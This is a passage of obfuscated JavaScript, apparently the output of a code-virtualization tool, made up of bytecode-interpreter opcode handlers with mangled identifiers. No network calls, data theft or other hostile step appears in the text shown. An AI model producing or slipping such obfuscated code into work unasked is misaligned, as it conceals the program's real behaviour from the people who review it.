                                                let xp = xd || A;
                                                if (xp)
                                                    for (let xX = 0x0; xX < xp['length']; xX++) {
                                                        xe[xX] = xp[xX];
                                                    }
                                                if (xI) {
                                                    let xw = function () {
                                                        throw new TypeError(
                                                            '\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them'
                                                        );
                                                    };
                                                    vmD(xe, 'callee', {
                                                        get: xw,
                                                        set: xw,
                                                        enumerable: ![],
                                                        configurable: ![],
                                                    });
                                                } else
                                                    vmD(xe, 'callee', {
                                                        value: X,
                                                        writable: !![],
                                                        enumerable: ![],
                                                        configurable: !![],
                                                    });
                                            } else {
                                                let xW = A ? A['length'] : 0x0,
                                                    xs = {},
                                                    xY = function (u0) {
                                                        return typeof u0 === 'string'
                                                            ? parseInt(u0, 0xa)
                                                            : NaN;
                                                    },
                                                    xO = function (u0) {
                                                        return !isNaN(u0) && u0 >= 0x0;
                                                    },
                                                    xc = function (u0) {
                                                        return u0 < A['length'] ? A[u0] : xs[u0];
                                                    },
                                                    xl = function (u0) {
                                                        return u0 < A['length']
                                                            ? u0 in A
                                                            : u0 in xs;
                                                    };
                                                xe = new Proxy([], {
                                                    get: function (u0, u1, u2) {
                                                        if (u1 === 'length') return xW;
                                                        if (u1 === 'callee') return X;
                                                        if (u1 === Symbol['iterator'])
                                                            return function () {
                                                                let u5 = 0x0;
                                                                return {
                                                                    next: function () {
                                                                        if (u5 < xW)
                                                                            return {
                                                                                value: xc(u5++),
                                                                                done: ![],
                                                                            };
                                                                        return { done: !![] };
                                                                    },
                                                                };
                                                            };
                                                        let u3 = xY(u1);
                                                        if (xO(u3)) return xc(u3);
                                                        if (u1 === 'hasOwnProperty')
                                                            return function (u5) {
                                                                if (
                                                                    u5 === 'length' ||
                                                                    u5 === 'callee'
                                                                )
                                                                    return !![];
                                                                let u6 = xY(u5);
                                                                return xO(u6) && u6 < xW && xl(u6);
                                                            };
                                                        let u4 = Array['prototype'][u1];
                                                        if (typeof u4 === 'function')
                                                            return function () {
                                                                let u5 = [];
                                                                for (let u6 = 0x0; u6 < xW; u6++) {
                                                                    u5[u6] = xc(u6);
                                                                }
                                                                return u4['apply'](u5, arguments);
                                                            };
                                                        return undefined;
                                                    },
                                                    set: function (u0, u1, u2) {
                                                        if (u1 === 'length')
                                                            return ((xW = u2), !![]);
                                                        let u3 = xY(u1);
                                                        if (xO(u3))
                                                            return (
                                                                u3 < A['length']
                                                                    ? (A[u3] = u2)
                                                                    : (xs[u3] = u2),
                                                                u3 >= xW && (xW = u3 + 0x1),
                                                                !![]
                                                            );
                                                        return !![];
                                                    },
                                                    has: function (u0, u1) {
                                                        if (u1 === 'length' || u1 === 'callee')
                                                            return !![];
                                                        let u2 = xY(u1);
                                                        if (xO(u2) && u2 < xW) return xl(u2);
                                                        return u1 in Array['prototype'];
                                                    },
                                                    deleteProperty: function (u0, u1) {
                                                        let u2 = xY(u1);
                                                        return (
                                                            xO(u2) &&
                                                                (u2 < A['length']
                                                                    ? delete A[u2]
                                                                    : delete xs[u2]),
                                                            !![]
                                                        );
                                                    },
                                                    getOwnPropertyDescriptor: function (u0, u1) {
                                                        if (u1 === 'callee')
                                                            return {
                                                                value: X,
                                                                writable: !![],
                                                                enumerable: ![],
                                                                configurable: !![],
                                                            };
                                                        if (u1 === 'length')
                                                            return {
                                                                value: xW,
                                                                writable: !![],
                                                                enumerable: ![],
                                                                configurable: !![],
                                                            };
                                                        let u2 = xY(u1);
                                                        if (xO(u2) && u2 < xW && xl(u2))
                                                            return {
                                                                value: xc(u2),
                                                                writable: !![],
                                                                enumerable: !![],
                                                                configurable: !![],
                                                            };
                                                        return undefined;
                                                    },
                                                    ownKeys: function (u0) {
                                                        let u1 = [];
                                                        for (let u2 = 0x0; u2 < xW; u2++) {
                                                            xl(u2) && u1['push'](String(u2));
                                                        }
                                                        return (u1['push']('length', 'callee'), u1);
                                                    },
                                                });
                                            }
                                        }
                                        (xR(xe), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        if (xA >= 0x0) {
                                            let xX = l[xA];
                                            xn['_$3NkOio'][xX] = xp;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD();
                                        if (Array['isArray'](xp))
                                            Array['prototype']['push']['apply'](xX, xp);
                                        else
                                            for (let xw of xp) {
                                                xX['push'](xw);
                                            }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xv(0x3),
                                            xX = xv(0x2),
                                            xw = xD();
                                        (xo(0x3, xX), xo(0x2, xw), xC(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR([]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xA,
                                            xW = (function (xs, xY) {
                                                let xO = function () {
                                                    if (xs) {
                                                        xY && (vmy_6c9c4d['_$AvDtgw'] = xO);
                                                        let xc = '_$4gk5HF' in vmy_6c9c4d;
                                                        !xc &&
                                                            (vmy_6c9c4d['_$4gk5HF'] = new.target);
                                                        try {
                                                            let xl = xs['apply'](
                                                                this,
                                                                v(arguments)
                                                            );
                                                            if (
                                                                xY &&
                                                                xl !== undefined &&
                                                                (typeof xl !== 'object' ||
                                                                    xl === null)
                                                            )
                                                                throw new TypeError(
                                                                    'Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined'
                                                                );
                                                            return xl;
                                                        } finally {
                                                            (xY && delete vmy_6c9c4d['_$AvDtgw'],
                                                                !xc &&
                                                                    delete vmy_6c9c4d['_$4gk5HF']);
                                                        }
                                                    }
                                                };
                                                return xO;
                                            })(xX, xw);
                                        xp && vmD(xW, 'name', { value: xp, configurable: !![] });
                                        (xR(xW), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        xp && typeof xp['return'] === 'function' && xp['return']();
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(l[xA]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = D(xE, xp),
                                            xw = xE();
                                        if (xA === 0x1) {
                                            (xR(xX), c++);
                                            break;
                                        }
                                        if (vmy_6c9c4d['_$3nldEM']) {
                                            c++;
                                            break;
                                        }
                                        let xW = vmy_6c9c4d['_$PTsoWy'];
                                        if (xW) {
                                            let xs = xW['parent'],
                                                xY = xW['newTarget'],
                                                xO = Reflect['construct'](xs, xX, xY);
                                            W &&
                                                W !== xO &&
                                                vmo(W)['forEach'](function (xc) {
                                                    !(xc in xO) && (xO[xc] = W[xc]);
                                                });
                                            ((W = xO), (xt = !![]));
                                            xa &&
                                                (L(xn, '__this__'),
                                                (xn['_$3NkOio']['__this__'] = W));
                                            c++;
                                            break;
                                        }
                                        if (typeof xw !== 'function')
                                            throw new TypeError(
                                                'Super\x20expression\x20must\x20be\x20a\x20constructor'
                                            );
                                        vmy_6c9c4d['_$4gk5HF'] = w;
                                        try {
                                            let xc = xw['apply'](W, xX);
                                            (xc !== undefined &&
                                                xc !== W &&
                                                typeof xc === 'object' &&
                                                (W && Object['assign'](xc, W), (W = xc)),
                                                (xt = !![]),
                                                xa &&
                                                    (L(xn, '__this__'),
                                                    (xn['_$3NkOio']['__this__'] = W)));
                                        } catch (xl) {
                                            if (
                                                xl instanceof TypeError &&
                                                (xl['message']['includes']('\x27new\x27') ||
                                                    xl['message']['includes']('constructor'))
                                            ) {
                                                let u0 = Reflect['construct'](xw, xX, w);
                                                (u0 !== W && W && Object['assign'](u0, W),
                                                    (W = u0),
                                                    (xt = !![]),
                                                    xa &&
                                                        (L(xn, '__this__'),
                                                        (xn['_$3NkOio']['__this__'] = W)));
                                            } else throw xl;
                                        } finally {
                                            delete vmy_6c9c4d['_$4gk5HF'];
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (xK && !xt)
                                            throw new ReferenceError(
                                                'Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor'
                                            );
                                        (xR(W), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        c = xB(x1[c]);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA];
                                        if (vmy_6c9c4d['_$S66XRr'] && xX in vmy_6c9c4d['_$S66XRr'])
                                            throw new ReferenceError(
                                                'Cannot\x20access\x20\x27' +
                                                    xX +
                                                    '\x27\x20before\x20initialization'
                                            );
                                        let xw = !(xX in vmy_6c9c4d) && !(xX in vmV);
                                        vmy_6c9c4d[xX] = xp;
                                        xX in vmV && (vmV[xX] = xp);
                                        xw && (vmV[xX] = xp);
                                        (xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX != xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX ** xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xE();
                                        (vmD(xw, xX, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: !![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA],
                                            xW = o(xX);
                                        (vmD(xW, xw, {
                                            get: xp,
                                            enumerable: xW === xX,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX >>> xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX << xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(!xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX == xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX;
                                        if (vmy_6c9c4d['_$S66XRr'] && xp in vmy_6c9c4d['_$S66XRr'])
                                            throw new ReferenceError(
                                                'Cannot\x20access\x20\x27' +
                                                    xp +
                                                    '\x27\x20before\x20initialization'
                                            );
                                        if (xp in vmy_6c9c4d) xX = vmy_6c9c4d[xp];
                                        else {
                                            if (xp in vmV) xX = vmV[xp];
                                            else
                                                throw new ReferenceError(
                                                    xp + '\x20is\x20not\x20defined'
                                                );
                                        }
                                        (xR(xX), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = u(xp),
                                            xw = xX && xX['a'],
                                            xW = xX && xX['s'],
                                            xs = xX && xX['g'],
                                            xY = xX && xX['m'],
                                            xO = (xX && xX['p']) || 0x0,
                                            xc = xX && xX['st'],
                                            xl = xw ? xm : undefined,
                                            u0 = xn,
                                            u1;
                                        if (xs) u1 = d(T, v, xp, u0, R, xc, vmV, G);
                                        else {
                                            if (xW) {
                                                if (xw) u1 = g(r, xp, u0, xl);
                                                else
                                                    xY
                                                        ? (u1 = N(r, v, xp, u0, xc, vmV, G))
                                                        : (u1 = m(r, v, xp, u0, xc, vmV, G));
                                            } else {
                                                if (xw) u1 = n(P, xp, u0, xl);
                                                else
                                                    xY
                                                        ? (u1 = J(P, v, xp, u0, xc, vmV, G))
                                                        : (u1 = t(P, v, xp, u0, xc, vmV, G));
                                            }
                                        }
                                        (E(u1, 'length', {
                                            value: xO,
                                            writable: ![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            xR(u1),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >> 0x10,
                                            xw = l[xp],
                                            xW = l[xX];
                                        (xR(new RegExp(xw, xW)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX >= xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(vmR[xA]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((O[xA] = O[xA] - 0x1), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA],
                                            xw = h(),
                                            xW = 'get_' + xX,
                                            xs = xw['get'](xW);
                                        if (xs && xs['has'](xp)) {
                                            let xl = xs['get'](xp);
                                            (xR(xl['call'](xp)), c++);
                                            break;
                                        }
                                        let xY =
                                            '_$d9i5Pn' + 'get_' + xX['substring'](0x1) + '_$TYH1Y4';
                                        if (xp['constructor'] && xY in xp['constructor']) {
                                            let u0 = xp['constructor'][xY];
                                            (xR(u0['call'](xp)), c++);
                                            break;
                                        }
                                        let xO = xw['get'](xX);
                                        if (xO && xO['has'](xp)) {
                                            (xR(xO['get'](xp)), c++);
                                            break;
                                        }
                                        let xc = K(xX);
                                        if (xc in xp) {
                                            (xR(xp[xc]), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20read\x20private\x20member\x20' +
                                                xX +
                                                '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        xp !== null && xp !== undefined ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10;
                                        (xR(O[xp] < l[xX]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA],
                                            xW = h(),
                                            xs = 'set_' + xw,
                                            xY = xW['get'](xs);
                                        if (xY && xY['has'](xX)) {
                                            let u0 = xY['get'](xX);
                                            (u0['call'](xX, xp), xR(xp), c++);
                                            break;
                                        }
                                        let xO =
                                            '_$d9i5Pn' + 'set_' + xw['substring'](0x1) + '_$TYH1Y4';
                                        if (xX['constructor'] && xO in xX['constructor']) {
                                            let u1 = xX['constructor'][xO];
                                            (u1['call'](xX, xp), xR(xp), c++);
                                            break;
                                        }
                                        let xc = xW['get'](xw);
                                        if (xc && xc['has'](xX)) {
                                            (xc['set'](xX, xp), xR(xp), c++);
                                            break;
                                        }
                                        let xl = K(xw);
                                        if (xl in xX) {
                                            ((xX[xl] = xp), xR(xp), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20write\x20private\x20member\x20' +
                                                xw +
                                                '\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        if (xp == null)
                                            throw new TypeError(
                                                'Cannot\x20iterate\x20over\x20' + xp
                                            );
                                        let xX = xp[Symbol['iterator']];
                                        if (typeof xX !== 'function')
                                            throw new TypeError('Object\x20is\x20not\x20iterable');
                                        (xR(xX['call'](xp)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA];
                                        (vmD(xX['prototype'], xw, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((O[xA] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX > xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xp['next']();
                                        (xR(xX), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        xX === null || xX === undefined
                                            ? xR(undefined)
                                            : xR(xX[xp]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(null), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = O[xA] + 0x1;
                                        ((O[xA] = xp), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = vmy_6c9c4d['_$nqVw0B'],
                                            xW = xw ? vmL(xw) : B(xX),
                                            xs = z(xW, xp);
                                        if (xs['desc'] && xs['desc']['get']) {
                                            let xO = xs['desc']['get']['call'](xX);
                                            (xR(xO), c++);
                                            break;
                                        }
                                        if (
                                            xs['desc'] &&
                                            xs['desc']['set'] &&
                                            !('value' in xs['desc'])
                                        ) {
                                            (xR(undefined), c++);
                                            break;
                                        }
                                        let xY = xs['proto'] ? xs['proto'][xp] : xW[xp];
                                        if (typeof xY === 'function') {
                                            let xc = xs['proto'] || xW,
                                                xl = xY['bind'](xX),
                                                u0 = xY['constructor'] && xY['constructor']['name'],
                                                u1 =
                                                    u0 === 'GeneratorFunction' ||
                                                    u0 === 'AsyncFunction' ||
                                                    u0 === 'AsyncGeneratorFunction';
                                            (!u1 &&
                                                (!vmy_6c9c4d['_$tMAf0M'] &&
                                                    (vmy_6c9c4d['_$tMAf0M'] = new WeakMap()),
                                                vmy_6c9c4d['_$tMAf0M']['set'](xl, xc)),
                                                xR(xl));
                                        } else xR(xY);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (x6['pop'](), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX = xE(),
                                            xw = xn,
                                            xW = ![];
                                        while (xw) {
                                            if (xw['_$3NkOio'] && xp in xw['_$3NkOio']) {
                                                if (xw['_$NJY3Sg'] && xp in xw['_$NJY3Sg']) break;
                                                xw['_$3NkOio'][xp] = xX;
                                                !xw['_$NJY3Sg'] && (xw['_$NJY3Sg'] = {});
                                                ((xw['_$NJY3Sg'][xp] = !![]), (xW = !![]));
                                                break;
                                            }
                                            xw = xw['_$lQV5eu'];
                                        }
                                        !xW &&
                                            (j(xn, xp),
                                            (xn['_$3NkOio'][xp] = xX),
                                            !xn['_$NJY3Sg'] && (xn['_$NJY3Sg'] = {}),
                                            (xn['_$NJY3Sg'][xp] = !![]));
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(-xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xE();
                                        if (typeof xX !== 'function')
                                            throw new TypeError(
                                                xX + '\x20is\x20not\x20a\x20function'
                                            );
                                        let xW = vmy_6c9c4d['_$tMAf0M'],
                                            xs = xW && xW['get'](xX),
                                            xY = vmy_6c9c4d['_$nqVw0B'];
                                        xs &&
                                            ((vmy_6c9c4d['_$lg2MJY'] = !![]),
                                            (vmy_6c9c4d['_$nqVw0B'] = xs));
                                        try {
                                            let xO = xX['apply'](xw, D(xE, xp));
                                            xR(xO);
                                        } finally {
                                            xs &&
                                                ((vmy_6c9c4d['_$lg2MJY'] = ![]),
                                                (vmy_6c9c4d['_$nqVw0B'] = xY));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX <= xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        if (xp == null)
                                            throw new TypeError(
                                                'Cannot\x20iterate\x20over\x20' + xp
                                            );
                                        let xX = xp[Symbol['asyncIterator']];
                                        if (typeof xX === 'function') xR(xX['call'](xp));
                                        else {
                                            let xw = xp[Symbol['iterator']];
                                            if (typeof xw !== 'function')
                                                throw new TypeError(
                                                    'Object\x20is\x20not\x20async\x20iterable'
                                                );
                                            xR(xw['call'](xp));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA],
                                            xX = xE(),
                                            xw = xn['_$lQV5eu'];
                                        xw && (xw['_$3NkOio'][xp] = xX);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(O[xA]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10;
                                        (xR(O[xp] - l[xX]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        xE();
                                        let xX = xD(),
                                            xw = l[xA],
                                            xW = h();
                                        !xW['has'](xw) && xW['set'](xw, new WeakMap());
                                        let xs = xW['get'](xw);
                                        (xs['set'](xX, xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX instanceof xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(C(xp)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(typeof xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA];
                                        (xR(Symbol['for'](xp)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD();
                                        xp !== null && xp !== undefined && Object['assign'](xX, xp);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX % xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD();
                                        (vmD(xw, xX, {
                                            get: xp,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xB(x1[c]);
                                        if (x6['length'] > 0x0) {
                                            let xX = x6[x6['length'] - 0x1];
                                            if (
                                                xX['_$Vdn9lU'] !== undefined &&
                                                xp >= xX['_$2AXo24']
                                            ) {
                                                ((x9['_$Mn6sWY'] = !![]),
                                                    (x9['_$2fOqlh'] = xp),
                                                    (c = xX['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        c = xp;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA];
                                        (vmD(xX, xw, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: !![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xD();
                                        (xC(xv(0x2)), xo(0x2, xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(xp), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(~xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xE();
                                        if (xw === null || xw === undefined)
                                            throw new TypeError(
                                                'Cannot\x20set\x20property\x20\x27' +
                                                    String(xX) +
                                                    '\x27\x20of\x20' +
                                                    xw
                                            );
                                        (f(xw, xX, xp, xI), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp, xX;
                                        xA !== undefined
                                            ? ((xX = xE()), (xp = l[xA]))
                                            : ((xp = xE()), (xX = xE()));
                                        let xw = delete xX[xp];
                                        if (xI && !xw)
                                            throw new TypeError(
                                                'Cannot\x20delete\x20property\x20\x27' +
                                                    String(xp) +
                                                    '\x27\x20of\x20object'
                                            );
                                        (xR(xw), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (x6['length'] > 0x0) {
                                            let xp = x6[x6['length'] - 0x1];
                                            if (xp['_$Vdn9lU'] !== undefined) {
                                                ((x8['_$csazO3'] = !![]),
                                                    (x8['_$VmqNsa'] = xE()),
                                                    (c = xp['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        x8['_$csazO3'] &&
                                            ((x8['_$csazO3'] = ![]), (x8['_$VmqNsa'] = undefined));
                                        ((xf = !![]), (xh = xE()));
                                        return;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(typeof xp === 'bigint' ? xp : +xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR({}), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(+xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(!!xp['done']), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((O[xA] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD();
                                        if (xp === null) {
                                            (vmz(xX['prototype'], null),
                                                vmz(xX, Function['prototype']),
                                                (xX['_$90oo3b'] = null),
                                                c++);
                                            break;
                                        }
                                        let xw = ![];
                                        try {
                                            let xW = vmC(xp['prototype']),
                                                xs = xp['apply'](xW, []);
                                            xs !== undefined && xs !== xW && (xw = !![]);
                                        } catch (xY) {
                                            xY instanceof TypeError &&
                                                (xY['message']['includes']('\x27new\x27') ||
                                                    xY['message']['includes']('constructor') ||
                                                    xY['message']['includes'](
                                                        'Illegal\x20constructor'
                                                    )) &&
                                                (xw = !![]);
                                        }
                                        if (xw) {
                                            let xO = xX,
                                                xc = vmy_6c9c4d,
                                                xl = '_$4gk5HF',
                                                u0 = '_$AvDtgw',
                                                u1 = '_$PTsoWy';
                                            function u2(...u3) {
                                                let u4 = vmC(xp['prototype']);
                                                ((xc[u1] = {
                                                    parent: xp,
                                                    newTarget: new.target || u2,
                                                }),
                                                    (xc[u0] = new.target || u2));
                                                let u5 = xl in xc;
                                                !u5 && (xc[xl] = new.target);
                                                try {
                                                    let u6 = xO['apply'](u4, u3);
                                                    u6 !== undefined &&
                                                        typeof u6 === 'object' &&
                                                        (u4 = u6);
                                                } finally {
                                                    (delete xc[u1],
                                                        delete xc[u0],
                                                        !u5 && delete xc[xl]);
                                                }
                                                return u4;
                                            }
                                            ((u2['prototype'] = vmC(xp['prototype'])),
                                                (u2['prototype']['constructor'] = u2),
                                                vmz(u2, xp),
                                                vmo(xO)['forEach'](function (u3) {
                                                    u3 !== 'prototype' &&
                                                        u3 !== 'length' &&
                                                        u3 !== 'name' &&
                                                        E(u2, u3, vmv(xO, u3));
                                                }));
                                            xO['prototype'] &&
                                                (vmo(xO['prototype'])['forEach'](function (u3) {
                                                    u3 !== 'constructor' &&
                                                        E(
                                                            u2['prototype'],
                                                            u3,
                                                            vmv(xO['prototype'], u3)
                                                        );
                                                }),
                                                vmB(xO['prototype'])['forEach'](function (u3) {
                                                    E(
                                                        u2['prototype'],
                                                        u3,
                                                        vmv(xO['prototype'], u3)
                                                    );
                                                }));
                                            (xE(), xR(u2), (u2['_$90oo3b'] = xp), c++);
                                            break;
                                        }
                                        (vmz(xX['prototype'], xp['prototype']),
                                            vmz(xX, xp),
                                            (xX['_$90oo3b'] = xp),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xE(), xR(undefined), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        debugger;
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA];
                                        (vmD(xX, xw, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD();
                                        (vmD(xw, xX, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX === xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX !== xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10;
                                        O[xp] < l[xX] ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = {
                                                ['_$3NkOio']: vmC(null),
                                                ['_$NJY3Sg']: vmC(null),
                                                ['_$0SKFtw']: vmC(null),
                                                ['_$lQV5eu']: xp,
                                            };
                                        ((xn = xX), c++);
                                        break;
                                    }
                                },
                                function (xA) {
